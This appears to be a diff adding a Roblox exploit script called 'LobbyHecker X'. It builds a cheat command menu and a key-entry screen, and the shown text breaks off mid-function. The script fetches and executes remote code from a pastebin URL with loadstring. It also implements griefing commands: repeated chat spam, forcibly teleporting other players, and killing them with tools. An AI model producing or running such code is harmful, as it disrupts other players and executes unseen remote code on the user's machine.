@@ -1,0 +1,1955 @@
+-- LobbyHecker X
+-- Made By: guter#8664 & faintah#3616
+-- Credits For Gui: $xn Zaxx-#1000
+
+-- Updates Every Week
+
+local ScreenGui = Instance.new("ScreenGui")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+local TextLabel_4 = Instance.new("TextLabel")
+local TextLabel_5 = Instance.new("TextLabel")
+local TextLabel_6 = Instance.new("TextLabel")
+local TextLabel_7 = Instance.new("TextLabel")
+local TextLabel_8 = Instance.new("TextLabel")
+local TextLabel_9 = Instance.new("TextLabel")
+local TextLabel_10 = Instance.new("TextLabel")
+local TextLabel_11 = Instance.new("TextLabel")
+local TextLabel_12 = Instance.new("TextLabel")
+local TextLabel_13 = Instance.new("TextLabel")
+local TextLabel_14 = Instance.new("TextLabel")
+local TextLabel_15 = Instance.new("TextLabel")
+local TextLabel_16 = Instance.new("TextLabel")
+local TextLabel_17 = Instance.new("TextLabel")
+local TextLabel_18 = Instance.new("TextLabel")
+local TextLabel_19 = Instance.new("TextLabel")
+local TextLabel_20 = Instance.new("TextLabel")
+local TextLabel_21 = Instance.new("TextLabel")
+local TextLabel_22 = Instance.new("TextLabel")
+local TextLabel_23 = Instance.new("TextLabel")
+local TextLabel_24 = Instance.new("TextLabel")
+local TextLabel_25 = Instance.new("TextLabel")
+local TextLabel_26 = Instance.new("TextLabel")
+local TextLabel_27 = Instance.new("TextLabel")
+local TextLabel_28 = Instance.new("TextLabel")
+local TextLabel_29 = Instance.new("TextLabel")
+local TextLabel_30 = Instance.new("TextLabel")
+local TextLabel_31 = Instance.new("TextLabel")
+local TextLabel_32 = Instance.new("TextLabel")
+local TextLabel_33 = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+ScrollingFrame.Parent = ScreenGui
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+ScrollingFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.Position = UDim2.new(0.0259694047, 0, 0.568684816, 0)
+ScrollingFrame.Size = UDim2.new(0, 271, 0, 309)
+
+TextLabel.Parent = ScrollingFrame
+TextLabel.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel.BorderColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel.Position = UDim2.new(-0.00499998406, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 272, 0, 18)
+TextLabel.Font = Enum.Font.GothamBold
+TextLabel.Text = "Credits : 3b1z / $xn Zaxx-"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 14.000
+
+TextLabel_2.Parent = ScrollingFrame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.Position = UDim2.new(0.485774904, 0, 0.0155518148, 0)
+TextLabel_2.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = ";rj (rejoins game)"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextSize = 14.000
+
+TextLabel_3.Parent = ScrollingFrame
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_3.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.Position = UDim2.new(-0.00177490711, 0, 0.015393205, 0)
+TextLabel_3.Size = UDim2.new(0, 126, 0, 32)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = ";mute (mutes boombox)"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextSize = 14.000
+
+TextLabel_4.Parent = ScrollingFrame
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_4.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.Position = UDim2.new(-0.00200000033, 0, 0.0390582532, 0)
+TextLabel_4.Size = UDim2.new(0, 126, 0, 32)
+TextLabel_4.Font = Enum.Font.SourceSans
+TextLabel_4.Text = ";antikill(Ppl cant kill you)"
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextSize = 14.000
+
+TextLabel_5.Parent = ScrollingFrame
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_5.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.Position = UDim2.new(0.483394831, 0, 0.0388349481, 0)
+TextLabel_5.Size = UDim2.new(0, 126, 0, 32)
+TextLabel_5.Font = Enum.Font.SourceSans
+TextLabel_5.Text = ";noclip "
+TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.TextSize = 14.000
+
+TextLabel_6.Parent = ScrollingFrame
+TextLabel_6.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_6.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.Position = UDim2.new(0.0036900267, 0, 0.274650574, 0)
+TextLabel_6.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_6.Font = Enum.Font.SourceSans
+TextLabel_6.Text = ";rhats (reset hats)"
+TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.TextSize = 14.000
+
+TextLabel_7.Parent = ScrollingFrame
+TextLabel_7.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_7.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.Position = UDim2.new(0.483394831, 0, 0.110764869, 0)
+TextLabel_7.Size = UDim2.new(0, 126, 0, 32)
+TextLabel_7.Font = Enum.Font.SourceSans
+TextLabel_7.Text = ";dance2 (r15)"
+TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_7.TextSize = 14.000
+
+TextLabel_8.Parent = ScrollingFrame
+TextLabel_8.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_8.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_8.Position = UDim2.new(2.04890966e-08, 0, 0.0878303796, 0)
+TextLabel_8.Size = UDim2.new(0, 126, 0, 32)
+TextLabel_8.Font = Enum.Font.SourceSans
+TextLabel_8.Text = ";givetool (hold tool)"
+TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_8.TextSize = 14.000
+
+TextLabel_9.Parent = ScrollingFrame
+TextLabel_9.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_9.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_9.Position = UDim2.new(0, 0, 0.111000001, 0)
+TextLabel_9.Size = UDim2.new(0, 126, 0, 32)
+TextLabel_9.Font = Enum.Font.SourceSans
+TextLabel_9.Text = ";dance1 (r15)"
+TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_9.TextSize = 14.000
+
+TextLabel_10.Parent = ScrollingFrame
+TextLabel_10.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_10.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_10.Position = UDim2.new(0.483394831, 0, 0.0876798183, 0)
+TextLabel_10.Size = UDim2.new(0, 126, 0, 32)
+TextLabel_10.Font = Enum.Font.SourceSans
+TextLabel_10.Text = ";to(player)"
+TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_10.TextSize = 14.000
+
+TextLabel_11.Parent = ScrollingFrame
+TextLabel_11.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_11.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_11.Position = UDim2.new(0.483394861, 0, 0.0627340749, 0)
+TextLabel_11.Size = UDim2.new(0, 126, 0, 32)
+TextLabel_11.Font = Enum.Font.SourceSans
+TextLabel_11.Text = ";tbring (player)"
+TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_11.TextSize = 14.000
+
+TextLabel_12.Parent = ScrollingFrame
+TextLabel_12.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_12.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_12.Position = UDim2.new(-1.67638063e-08, 0, 0.0631768703, 0)
+TextLabel_12.Size = UDim2.new(0, 126, 0, 32)
+TextLabel_12.Font = Enum.Font.SourceSans
+TextLabel_12.Text = ";tkill (must have tool)"
+TextLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_12.TextSize = 14.000
+
+TextLabel_13.Parent = ScrollingFrame
+TextLabel_13.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_13.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_13.Position = UDim2.new(0.487084866, 0, 0.227465108, 0)
+TextLabel_13.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_13.Font = Enum.Font.SourceSans
+TextLabel_13.Text = ";blackhole (press e)"
+TextLabel_13.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_13.TextSize = 14.000
+
+TextLabel_14.Parent = ScrollingFrame
+TextLabel_14.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_14.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_14.Position = UDim2.new(0.487084836, 0, 0.298188895, 0)
+TextLabel_14.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_14.Font = Enum.Font.SourceSans
+TextLabel_14.Text = ";infjump (F to disable)"
+TextLabel_14.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_14.TextSize = 14.000
+
+TextLabel_15.Parent = ScrollingFrame
+TextLabel_15.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_15.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_15.Position = UDim2.new(0.0036900267, 0, 0.298270851, 0)
+TextLabel_15.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_15.Font = Enum.Font.SourceSans
+TextLabel_15.Text = ";orbit2"
+TextLabel_15.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_15.TextSize = 14.000
+
+TextLabel_16.Parent = ScrollingFrame
+TextLabel_16.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_16.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_16.Position = UDim2.new(0.487084866, 0, 0.27447167, 0)
+TextLabel_16.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_16.Font = Enum.Font.SourceSans
+TextLabel_16.Text = ";orbit"
+TextLabel_16.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_16.TextSize = 14.000
+
+TextLabel_17.Parent = ScrollingFrame
+TextLabel_17.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_17.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_17.Position = UDim2.new(0.487084866, 0, 0.250568062, 0)
+TextLabel_17.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_17.Font = Enum.Font.SourceSans
+TextLabel_17.Text = ";visualizer"
+TextLabel_17.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_17.TextSize = 14.000
+
+TextLabel_18.Parent = ScrollingFrame
+TextLabel_18.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_18.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_18.Position = UDim2.new(0.00369003415, 0, 0.251122653, 0)
+TextLabel_18.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_18.Font = Enum.Font.SourceSans
+TextLabel_18.Text = ";halo"
+TextLabel_18.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_18.TextSize = 14.000
+
+TextLabel_19.Parent = ScrollingFrame
+TextLabel_19.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_19.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_19.Position = UDim2.new(0.00369003415, 0, 0.227706596, 0)
+TextLabel_19.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_19.Font = Enum.Font.SourceSans
+TextLabel_19.Text = ";antiafk"
+TextLabel_19.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_19.TextSize = 14.000
+
+TextLabel_20.Parent = ScrollingFrame
+TextLabel_20.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_20.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_20.Position = UDim2.new(0.483394831, 0, 0.203330413, 0)
+TextLabel_20.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_20.Font = Enum.Font.SourceSans
+TextLabel_20.Text = ";add (spams chat)"
+TextLabel_20.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_20.TextSize = 14.000
+
+TextLabel_21.Parent = ScrollingFrame
+TextLabel_21.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_21.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_21.Position = UDim2.new(0.00369002204, 0, 0.203579381, 0)
+TextLabel_21.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_21.Font = Enum.Font.SourceSans
+TextLabel_21.Text = ";chant (spams chat)"
+TextLabel_21.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_21.TextSize = 14.000
+
+TextLabel_22.Parent = ScrollingFrame
+TextLabel_22.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_22.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_22.Position = UDim2.new(0.487084866, 0, 0.180439129, 0)
+TextLabel_22.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_22.Font = Enum.Font.SourceSans
+TextLabel_22.Text = ";fly (E to unfly)"
+TextLabel_22.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_22.TextSize = 14.000
+
+TextLabel_23.Parent = ScrollingFrame
+TextLabel_23.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_23.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_23.Position = UDim2.new(0.00400000019, 0, 0.180000007, 0)
+TextLabel_23.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_23.Font = Enum.Font.SourceSans
+TextLabel_23.Text = ";secretplace"
+TextLabel_23.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_23.TextSize = 14.000
+
+TextLabel_24.Parent = ScrollingFrame
+TextLabel_24.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_24.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_24.Position = UDim2.new(0.487084866, 0, 0.157343596, 0)
+TextLabel_24.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_24.Font = Enum.Font.SourceSans
+TextLabel_24.Text = ";joindate (player)"
+TextLabel_24.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_24.TextSize = 14.000
+
+TextLabel_25.Parent = ScrollingFrame
+TextLabel_25.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_25.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_25.Position = UDim2.new(0.00360515714, 0, 0.157000005, 0)
+TextLabel_25.Size = UDim2.new(0, 126, 0, 32)
+TextLabel_25.Font = Enum.Font.SourceSans
+TextLabel_25.Text = ";masstkill"
+TextLabel_25.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_25.TextSize = 14.000
+
+TextLabel_26.Parent = ScrollingFrame
+TextLabel_26.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_26.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_26.Position = UDim2.new(0.487084866, 0, 0.133949921, 0)
+TextLabel_26.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_26.Font = Enum.Font.SourceSans
+TextLabel_26.Text = ";undance (r15)"
+TextLabel_26.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_26.TextSize = 14.000
+
+TextLabel_27.Parent = ScrollingFrame
+TextLabel_27.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_27.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_27.Position = UDim2.new(0.487084866, 0, 0.321997076, 0)
+TextLabel_27.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_27.Font = Enum.Font.SourceSans
+TextLabel_27.Text = ";knife"
+TextLabel_27.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_27.TextSize = 14.000
+
+TextLabel_28.Parent = ScrollingFrame
+TextLabel_28.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_28.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_28.Position = UDim2.new(0.00369001925, 0, 0.322059661, 0)
+TextLabel_28.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_28.Font = Enum.Font.SourceSans
+TextLabel_28.Text = ";winkyname (RP NAME)"
+TextLabel_28.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_28.TextSize = 14.000
+
+TextLabel_29.Parent = ScrollingFrame
+TextLabel_29.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_29.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_29.Position = UDim2.new(0.483394831, 0, 0.345545828, 0)
+TextLabel_29.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_29.Font = Enum.Font.SourceSans
+TextLabel_29.Text = ";pew  (RP NAME)"
+TextLabel_29.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_29.TextSize = 14.000
+
+TextLabel_30.Parent = ScrollingFrame
+TextLabel_30.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_30.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_30.Position = UDim2.new(0.487084866, 0, 0.368720353, 0)
+TextLabel_30.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_30.Font = Enum.Font.SourceSans
+TextLabel_30.Text = ";loopcbring (player)"
+TextLabel_30.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_30.TextSize = 14.000
+
+TextLabel_31.Parent = ScrollingFrame
+TextLabel_31.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_31.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_31.Position = UDim2.new(0.00369001925, 0, 0.368869424, 0)
+TextLabel_31.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_31.Font = Enum.Font.SourceSans
+TextLabel_31.Text = ";chatspy (priv chats )"
+TextLabel_31.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_31.TextSize = 14.000
+
+TextLabel_32.Parent = ScrollingFrame
+TextLabel_32.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_32.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_32.Position = UDim2.new(0.00369001925, 0, 0.345055312, 0)
+TextLabel_32.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_32.Font = Enum.Font.SourceSans
+TextLabel_32.Text = ";setafk(RP NAME)"
+TextLabel_32.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_32.TextSize = 14.000
+
+TextLabel_33.Parent = ScrollingFrame
+TextLabel_33.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+TextLabel_33.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_33.Position = UDim2.new(0.00369003415, 0, 0.134362891, 0)
+TextLabel_33.Size = UDim2.new(0, 125, 0, 32)
+TextLabel_33.Font = Enum.Font.SourceSans
+TextLabel_33.Text = ";dance3 (r15)"
+TextLabel_33.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_33.TextSize = 14.000
+
+TextButton.Parent = ScrollingFrame
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.Position = UDim2.new(0.870848656, 0, 0, 0)
+TextButton.Size = UDim2.new(0, 20, 0, 20)
+TextButton.Font = Enum.Font.GothamBold
+TextButton.Text = "X"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 20.000
+
+-- Scripts:
+
+local function DXFLH_fake_script() -- ScrollingFrame.LocalScript 
+	local script = Instance.new('LocalScript', ScrollingFrame)
+
+	local plr = game.Players.LocalPlayer
+
+	plr:GetMouse().KeyDown:Connect(function(K)
+		if K == "l" then
+			script.Parent.Visible = true
+		end
+	end)
+end
+coroutine.wrap(DXFLH_fake_script)()
+local function JUYKAIK_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Visible = false
+	end)
+end
+coroutine.wrap(JUYKAIK_fake_script)()
+local function KAQIL_fake_script() -- ScreenGui.LocalScript 
+	local script = Instance.new('LocalScript', ScreenGui)
+
+	print("Hello world!")
+
+end
+coroutine.wrap(KAQIL_fake_script)()
+
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local Bar = Instance.new("Frame")
+local Thing = Instance.new("Frame")
+local Key = Instance.new("TextBox")
+local Submit = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.407812506, 0, 0.379606873, 0)
+Frame.Size = UDim2.new(0, 354, 0, 195)
+Title.Name = "Title"
+Title.Parent = Frame
+Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1.000
+Title.BorderSizePixel = 0
+Title.Position = UDim2.new(0.152999997, 0, 0.27700001, 0)
+Title.Size = UDim2.new(0, 245, 0, 86)
+Title.Font = Enum.Font.SourceSansLight
+Title.Text = "LobbyHecker X"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextScaled = true
+Title.TextSize = 14.000
+Title.TextWrapped = true
+
+Bar.Name = "Bar"
+Bar.Parent = Frame
+Bar.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
+Bar.BackgroundTransparency = 1.000
+Bar.BorderSizePixel = 0
+Bar.Position = UDim2.new(0.048022598, 0, 0.646153867, 0)
+Bar.Size = UDim2.new(0, 320, 0, 4)
+
+Thing.Name = "Thing"
+Thing.Parent = Bar
+Thing.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Thing.BorderSizePixel = 0
+Thing.Size = UDim2.new(0, 0, 1, 0)
+
+Key.Name = "Key"
+Key.Parent = Frame
+Key.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Key.BackgroundTransparency = 1.000
+Key.BorderSizePixel = 0
+Key.Position = UDim2.new(0.217514127, 0, 0.374358982, 0)
+Key.Size = UDim2.new(0, 200, 0, 22)
+Key.Font = Enum.Font.SourceSansLight
+Key.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
+Key.PlaceholderText = "Key"
+Key.Text = ""
+Key.TextColor3 = Color3.fromRGB(0, 0, 0)
+Key.TextSize = 14.000
+Key.TextTransparency = 1.000
+
+Submit.Name = "Submit"
+Submit.Parent = Frame
+Submit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Submit.BackgroundTransparency = 1.000
+Submit.BorderSizePixel = 0
+Submit.Position = UDim2.new(0.217514127, 0, 0.605128229, 0)
+Submit.Size = UDim2.new(0, 200, 0, 22)
+Submit.Font = Enum.Font.SourceSansLight
+Submit.Text = "Submit"
+Submit.TextColor3 = Color3.fromRGB(0, 0, 0)
+Submit.TextSize = 14.000
+Submit.TextTransparency = 1.000
+
+-- Scripts:
+
+local function GXTYY_fake_script() -- Frame.LocalScript 
+	local script = Instance.new('LocalScript', Frame)
+
+	local ttl = script.Parent.Title
+	local bar = script.Parent.Bar.Thing
+	local txt = script.Parent.Key
+	local btn = script.Parent.Submit
+
+	local function bt(obj, bt, time)
+		local ti = TweenInfo.new(time)
+		local tw = game.TweenService:Create(obj, ti, {BackgroundTransparency = bt})
+		tw:Play()
+	end
+
+	local function tt(obj, tt, time)
+		local ti = TweenInfo.new(time)
+		local tw = game.TweenService:Create(obj, ti, {TextTransparency = tt})
+		tw:Play()
+	end
+
+
+	--[[
+	OG Size: UDim2.new(0, 245, 0, 86)
+	OG Pos: UDim2.new(0.153, 0, 0.277, 0)
+	--]]
+
+	wait(3)
+	ttl:TweenSizeAndPosition(UDim2.new(0, 141, 0, 29), UDim2.new(0.299, 0, 0.062, 0), "Out", "Quint", 0.8, true)
+	bt(bar, 0, 1)
+	bt(bar.Parent, 0, 1)
+	wait(1.1)
+	bar:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Quint", 2, true)
+	wait(1.8)
+	bt(bar, 1, 1)
+	bt(bar.Parent, 1, 1)
+	wait(1.1)
+	bt(txt, 0, 1)
+	bt(btn, 0, 1)
+	wait(1)
+	tt(txt, 0, 1)
+	tt(btn, 0, 1)
+
+	btn.MouseButton1Click:Connect(function()
+		if txt.Text == "" then
+			tt(txt, 1, 1)
+			tt(btn, 1, 1)
+			bt(txt, 1, 1)
+			bt(btn, 1, 1)
+			wait(1)
+			tt(ttl, 1, 1)
+			wait(1)
+			script.Parent:TweenSizeAndPosition(UDim2.new(0, 0, 0, 0), UDim2.new(0.5, 0, 0.5, 0), "Out", "Quint", 1, true)
+
+
+			local LocalPlayer = game.Players.LocalPlayer
+			local whitelist = Instance.new("Script")
+			whitelist.Parent = LocalPlayer.PlayerScripts
+			whitelist.Name = "LHWhitelist"
+			whitelist.Source = Key.Text
+			loadstring(game:HttpGet(('https://pastebin.com/raw/XTmMzATJ'),true))()
+			--//END NETWORK FOR NOW
+			local settings = {
+				prefix = ";",
+				version = "1.0",
+				welcomemsg = "Made By faintah#3616 and guter#8664, enjoy!!"
+			}
+			--// R15 anim function
+			function PlayAnim(id)
+				animationdebounce = true
+				local Anim = Instance.new("Animation")
+				Anim.AnimationId = "rbxassetid://" .. id
+				local salute = LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
+				salute.Name = "AP"
+				salute:Play()
+				salute.Stopped:Connect(
+					function()
+						LocalPlayer.Character.Animate.Disabled = false
+						animationdebounce = false
+					end
+				)
+			end
+			--// CHAT SHIT
+
+			LocalPlayer.Chatted:Connect(
+				function(msg)
+					msg = msg:lower()
+					if string.sub(msg, 1, 3) == "/e " then
+						msg = string.sub(msg, 4)
+					end
+					if string.sub(msg, 1, 1) == settings.prefix then
+						local cmd
+						local space = string.find(msg, " ")
+						if space then
+							cmd = string.sub(msg, 2, space - 1)
+						else
+							cmd = string.sub(msg, 2)
+						end
+						--// START OF COMMANDS
+						if cmd == "add" then 
+							-- Script generated by SimpleSpy - credits to exx#9394
+
+							local args = {
+								[1] = "add guter 8664 -- for the best free testing place admin (EXPLOIT)",
+								[2] = "All"
+							} 
+							for i=1, 5 do 
+								wait(0.1)
+								game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+							end
+						end
+
+						if cmd == "joindate" then
+							wait(0.5)
+							local var = string.sub(msg, space + 1)
+							local target = GetPlayer(var)
+							local tbl =
+								game:GetService("HttpService"):JSONDecode(
+							game:HttpGet("https://users.roblox.com/v1/users/" .. target.UserId)
+							)
+							local Created = tbl["created"]:split("T")
+							local Created2 = Created[2]:split(".")
+							local args = {
+								[1] = target.Name .. " joined on: " .. Created[1] .. " " .. Created2[1],
+								[2] = "All"
+							}
+							game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+							unpack(args)
+							)
+						end
+						if cmd == "loopcbring" then
+							local target = GetPlayer(string.sub(msg, space + 1))
+							while wait() do 
+								target.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(3,0,0)
+							end
+						end
+						if cmd == "claim" then
+							local var = string.sub(msg, space + 1)
+							local Player = GetPlayer(var)
+							if Player and Player.Character and (Player.Character:FindFirstChild("Right Arm") and Player.Character:FindFirstChild("Right Arm"):IsA("BasePart") or Player.Character:FindFirstChild("Right Hand") and Player.Character:FindFirstChild("Right Hand"):IsA("BasePart")) then
+								if LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then 
+									LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):Destroy()
+								end
+								Instance.new("Humanoid").Parent = LocalPlayer.Character
+								local Tool = LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
+								Tool.Parent = LocalPlayer.Character
+								if Tool:FindFirstChild("Handle") and Player.Character.PrimaryPart ~= nil then
+									repeat
+										Player.Character:SetPrimaryPartCFrame(Tool.Handle.CFrame)
+										game:GetService("RunService").Stepped:Wait()
+									until Tool.Parent == Player.Character
+
+									Workspace.FallenPartsDestroyHeight = 0/1/0
+									local CurrentCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
+
+									for i = 1, 100 do
+										LocalPlayer.Character.HumanoidRootPart.CFrame = CurrentCFrame - Vector3.new(0, math.huge, 0)
+									end
+									wait(0.3)
+									for i = 1, 100 do
+										LocalPlayer.Character.HumanoidRootPart.CFrame = CurrentCFrame
+									end
+									wait(0.2)
+									LocalPlayer.Character:BreakJoints()
